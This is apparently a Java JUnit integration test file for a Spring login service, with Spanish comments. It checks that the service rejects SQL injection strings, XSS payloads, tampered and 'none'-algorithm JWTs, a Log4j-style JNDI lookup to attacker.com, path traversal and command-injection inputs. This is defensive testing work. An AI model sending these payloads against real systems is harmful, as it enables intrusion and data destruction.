package mx.com.qtx.seguridad.security;

import mx.com.qtx.seguridad.integration.BaseIntegrationTest;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;

import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.IntStream;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Pruebas de seguridad para validar protecciones contra ataques comunes
 * Incluye pruebas de SQL injection, XSS, CSRF, brute force, etc.
 */
@DisplayName("Security Attack Protection Tests")
public class SecurityAttackProtectionTest extends BaseIntegrationTest {

    // ===============================
    // PRUEBAS DE INYECCIÓN SQL
    // ===============================

    @Test
    @DisplayName("Debe prevenir SQL Injection en campo usuario")
    void shouldPreventSqlInjectionInUsername() {
        // Given - Intentos de SQL injection típicos
        String[] sqlInjectionAttempts = {
            "admin'; DROP TABLE usuario; --",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM usuario --",
            "admin'; INSERT INTO usuario VALUES ('hacker', 'pass'); --",
            "' OR 1=1 --",
            "admin'/**/OR/**/1=1--",
            "admin' OR 'x'='x"
        };

        for (String maliciousInput : sqlInjectionAttempts) {
            Map<String, String> loginRequest = Map.of(
                "usuario", maliciousInput,
                "password", "password123"
            );

            // When
            ResponseEntity<Map> response = restTemplate.postForEntity(
                    baseUrl + "/auth/login",
                    createJsonEntity(loginRequest),
                    Map.class
            );

            // Then
            assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
            assertNotNull(response.getBody());
            assertEquals("invalid_credentials", response.getBody().get("error"));
        }
    }

    @Test
    @DisplayName("Debe prevenir SQL Injection en campo password")
    void shouldPreventSqlInjectionInPassword() {
        // Given
        String[] sqlInjectionAttempts = {
            "password'; DROP TABLE usuario; --",
            "password' OR '1'='1",
            "password' UNION SELECT * FROM usuario --"
        };

        for (String maliciousInput : sqlInjectionAttempts) {
            Map<String, String> loginRequest = Map.of(
                "usuario", "admin",
                "password", maliciousInput
            );

            // When
            ResponseEntity<Map> response = restTemplate.postForEntity(
                    baseUrl + "/auth/login",
                    createJsonEntity(loginRequest),
                    Map.class
            );

            // Then
            assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
            assertNotNull(response.getBody());
            assertEquals("invalid_credentials", response.getBody().get("error"));
        }
    }

    // ===============================
    // PRUEBAS DE XSS (Cross-Site Scripting)
    // ===============================

    @Test
    @DisplayName("Debe prevenir XSS en respuestas de error")
    void shouldPreventXssInErrorResponses() {
        // Given - Intentos de XSS típicos
        String[] xssAttempts = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        };

        for (String maliciousInput : xssAttempts) {
            Map<String, String> loginRequest = Map.of(
                "usuario", maliciousInput,
                "password", "password123"
            );

            // When
            ResponseEntity<String> response = restTemplate.postForEntity(
                    baseUrl + "/auth/login",
                    createJsonEntity(loginRequest),
                    String.class
            );

            // Then
            assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
            String responseContent = response.getBody();
            assertNotNull(responseContent);
            
            // Verificar que la respuesta no contiene scripts ejecutables
            assertFalse(responseContent.contains("<script>"));
            assertFalse(responseContent.contains("javascript:"));
            assertFalse(responseContent.contains("onerror="));
            assertFalse(responseContent.contains("onload="));
        }
    }

    // ===============================
    // PRUEBAS DE BRUTE FORCE
    // ===============================

    @Test
    @DisplayName("Debe manejar múltiples intentos de login fallidos")
    void shouldHandleMultipleFailedLoginAttempts() {
        // Given
        Map<String, String> loginRequest = Map.of(
            "usuario", "admin",
            "password", "wrongpassword"
        );

        // When - Realizar múltiples intentos fallidos
        for (int i = 0; i < 10; i++) {
            ResponseEntity<Map> response = restTemplate.postForEntity(
                    baseUrl + "/auth/login",
                    createJsonEntity(loginRequest),
                    Map.class
            );
            
            assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
            assertEquals("invalid_credentials", response.getBody().get("error"));
        }

        // Then - El servicio debe seguir funcionando (no bloqueado)
        Map<String, String> validLogin = Map.of(
            "usuario", "admin",
            "password", "admin123"
        );

        ResponseEntity<Map> validResponse = restTemplate.postForEntity(
                baseUrl + "/auth/login",
                createJsonEntity(validLogin),
                Map.class
        );
        
        assertEquals(HttpStatus.OK, validResponse.getStatusCode());
    }

    @Test
    @DisplayName("Debe manejar ataques de fuerza bruta concurrentes")
    void shouldHandleConcurrentBruteForceAttacks() {
        // Given
        ExecutorService executor = Executors.newFixedThreadPool(10);
        
        try {
            // When - Lanzar múltiples ataques concurrentes
            CompletableFuture<Void>[] futures = IntStream.range(0, 20)
                .mapToObj(i -> CompletableFuture.runAsync(() -> {
                    try {
                        Map<String, String> loginRequest = Map.of(
                            "usuario", "admin",
                            "password", "wrongpassword" + i
                        );

                        restTemplate.postForEntity(
                                baseUrl + "/auth/login",
                                createJsonEntity(loginRequest),
                                Map.class
                        );
                    } catch (Exception e) {
                        // Se espera que algunos fallen
                    }
                }, executor))
                .toArray(CompletableFuture[]::new);

            CompletableFuture.allOf(futures).join();

            // Then - El servicio debe seguir respondiendo
            Map<String, String> validLogin = Map.of(
                "usuario", "admin",
                "password", "admin123"
            );

            ResponseEntity<Map> response = restTemplate.postForEntity(
                    baseUrl + "/auth/login",
                    createJsonEntity(validLogin),
                    Map.class
            );
            
            assertEquals(HttpStatus.OK, response.getStatusCode());
                    
        } finally {
            executor.shutdown();
        }
    }

    // ===============================
    // PRUEBAS DE MANIPULACIÓN DE TOKENS
    // ===============================

    @Test
    @DisplayName("Debe rechazar tokens JWT manipulados")
    void shouldRejectManipulatedJwtTokens() {
        // Given - Obtener token válido
        String validToken = performTestLogin("admin", "admin123");
        
        // Manipular diferentes partes del token
        String[] manipulatedTokens = {
            validToken.substring(0, validToken.length() - 5) + "XXXXX", // Cambiar signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9." + validToken.split("\\.")[1] + "." + validToken.split("\\.")[2], // Cambiar header
            validToken.split("\\.")[0] + ".eyJzdWIiOiJoYWNrZXIiLCJpYXQiOjE2MjM5NzAyMDB9." + validToken.split("\\.")[2], // Cambiar payload
            validToken + "extra", // Agregar caracteres extra
            validToken.replace('a', 'b') // Cambiar caracteres aleatorios
        };

        for (String manipulatedToken : manipulatedTokens) {
            // When
            ResponseEntity<Map> response = restTemplate.exchange(
                    baseUrl + "/auth/validate",
                    org.springframework.http.HttpMethod.GET,
                    createAuthEntity(manipulatedToken),
                    Map.class
            );

            // Then
            assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
            assertNotNull(response.getBody());
            assertEquals("authentication_failed", response.getBody().get("errorType"));
        }
    }

    @Test
    @DisplayName("Debe rechazar tokens con algoritmo 'none'")
    void shouldRejectNoneAlgorithmTokens() {
        // Given - Token con algoritmo 'none' (ataque conocido)
        String noneAlgToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYyMzk3MDIwMH0.";

        // When
        ResponseEntity<Map> response = restTemplate.exchange(
                baseUrl + "/auth/validate",
                org.springframework.http.HttpMethod.GET,
                createAuthEntity(noneAlgToken),
                Map.class
        );

        // Then
        assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
        assertNotNull(response.getBody());
        assertEquals("authentication_failed", response.getBody().get("errorType"));
    }

    // ===============================
    // PRUEBAS DE HEADERS DE SEGURIDAD
    // ===============================

    @Test
    @DisplayName("Debe incluir headers de seguridad en las respuestas")
    void shouldIncludeSecurityHeaders() {
        // When
        ResponseEntity<Map> response = restTemplate.getForEntity(
                baseUrl + "/auth/health",
                Map.class
        );

        // Then
        assertEquals(HttpStatus.OK, response.getStatusCode());
        
        // Verificar headers de seguridad
        assertTrue(response.getHeaders().containsKey("X-Content-Type-Options"));
        assertTrue(response.getHeaders().containsKey("X-Frame-Options"));
        assertTrue(response.getHeaders().containsKey("X-XSS-Protection"));
    }

    // ===============================
    // PRUEBAS DE VALIDACIÓN DE ENTRADA
    // ===============================

    @Test
    @DisplayName("Debe validar longitud máxima de campos de entrada")
    void shouldValidateMaxFieldLength() {
        // Given - Campos extremadamente largos
        String longString = "a".repeat(10000);
        
        Map<String, String> loginRequest = Map.of(
            "usuario", longString,
            "password", longString
        );

        // When
        ResponseEntity<Map> response = restTemplate.postForEntity(
                baseUrl + "/auth/login",
                createJsonEntity(loginRequest),
                Map.class
        );

        // Then - 400 Bad Request o similar
        assertTrue(response.getStatusCode().is4xxClientError());
    }

    @Test
    @DisplayName("Debe rechazar caracteres especiales peligrosos")
    void shouldRejectDangerousSpecialCharacters() {
        // Given
        String[] dangerousInputs = {
            "admin\0password", // Null byte injection
            "admin\r\nSet-Cookie: admin=true", // HTTP Response Splitting
            "admin${jndi:ldap://attacker.com/a}", // Log4j style injection
            "admin#{7*7}", // Expression Language injection
            "../../../etc/passwd", // Path traversal
            "admin|whoami", // Command injection attempt
        };

        for (String dangerousInput : dangerousInputs) {
            Map<String, String> loginRequest = Map.of(
                "usuario", dangerousInput,
                "password", "password123"
            );

            // When
            ResponseEntity<Map> response = restTemplate.postForEntity(
                    baseUrl + "/auth/login",
                    createJsonEntity(loginRequest),
                    Map.class
            );

            // Then
            assertEquals(HttpStatus.UNAUTHORIZED, response.getStatusCode());
            assertNotNull(response.getBody());
            assertEquals("invalid_credentials", response.getBody().get("error"));
        }
    }

    // ===============================
    // PRUEBAS DE RATE LIMITING
    // ===============================

    @Test
    @DisplayName("Debe manejar ráfagas de requests usando ciclo login-logout completo")
    void shouldHandleRequestBursts() {
        // Given - Usar el mismo usuario reutilizando sesiones mediante logout
        String usuario = "admin";
        String password = "admin123";
        
        // When - Realizar muchas requests usando ciclo completo login → logout → re-login
        for (int i = 0; i < 20; i++) {
            // 1. LOGIN - Crear nueva sesión
            Map<String, String> loginRequest = Map.of(
                "usuario", usuario,
                "password", password
            );
            
            ResponseEntity<Map> loginResponse = restTemplate.postForEntity(
                    baseUrl + "/auth/login",
                    createJsonEntity(loginRequest),
                    Map.class
            );
            
            // Verificar que el login fue exitoso
            assertEquals(HttpStatus.OK, loginResponse.getStatusCode());
            assertNotNull(loginResponse.getBody());
            
            @SuppressWarnings("unchecked")
            Map<String, Object> loginBody = (Map<String, Object>) loginResponse.getBody();
            String accessToken = (String) loginBody.get("accessToken");
            String refreshToken = (String) loginBody.get("refreshToken");
            
            assertNotNull(accessToken);
            assertNotNull(refreshToken);
            assertEquals("Bearer", loginBody.get("tokenType"));
            
            // 2. LOGOUT - Cerrar sesión correctamente para liberar al usuario
            Map<String, String> logoutRequest = Map.of(
                "accessToken", accessToken,
                "refreshToken", refreshToken
            );
            
            ResponseEntity<Map> logoutResponse = restTemplate.exchange(
                    baseUrl + "/auth/logout",
                    org.springframework.http.HttpMethod.POST,
                    createAuthEntity(logoutRequest, accessToken),
                    Map.class
            );
            
            // Verificar que el logout fue exitoso
            assertEquals(HttpStatus.OK, logoutResponse.getStatusCode());
            assertNotNull(logoutResponse.getBody());
            
            @SuppressWarnings("unchecked")
            Map<String, Object> logoutBody = (Map<String, Object>) logoutResponse.getBody();
            assertEquals("Sesión cerrada exitosamente", logoutBody.get("message"));
            assertEquals("success", logoutBody.get("status"));
            
            // 3. El siguiente ciclo puede reusar el mismo usuario porque la sesión está cerrada
        }
        
        // Then - Verificar que después de todo el ciclo, el usuario puede hacer login nuevamente
        Map<String, String> finalLoginRequest = Map.of(
            "usuario", usuario,
            "password", password
        );
        
        ResponseEntity<Map> finalResponse = restTemplate.postForEntity(
                baseUrl + "/auth/login",
                createJsonEntity(finalLoginRequest),
                Map.class
        );
        
        assertEquals(HttpStatus.OK, finalResponse.getStatusCode());
        assertNotNull(finalResponse.getBody());
    }

    // ===============================
    // PRUEBAS DE TIMEOUT Y RECURSOS
    // ===============================

    @Test
    @DisplayName("Debe manejar timeout en operaciones de autenticación")
    void shouldHandleAuthenticationTimeout() {
        // Given
        Map<String, String> loginRequest = Map.of(
            "usuario", "admin",
            "password", "admin123"
        );

        // When - Verificar que la respuesta llega en tiempo razonable
        long startTime = System.currentTimeMillis();
        
        ResponseEntity<Map> response = restTemplate.postForEntity(
                baseUrl + "/auth/login",
                createJsonEntity(loginRequest),
                Map.class
        );
                
        long endTime = System.currentTimeMillis();
        long duration = endTime - startTime;
        
        // Then
        assertEquals(HttpStatus.OK, response.getStatusCode());
        
        // Verificar que no toma más de 5 segundos (configurable)
        assertTrue(duration < 5000, "Authentication took too long: " + duration + "ms");
    }
}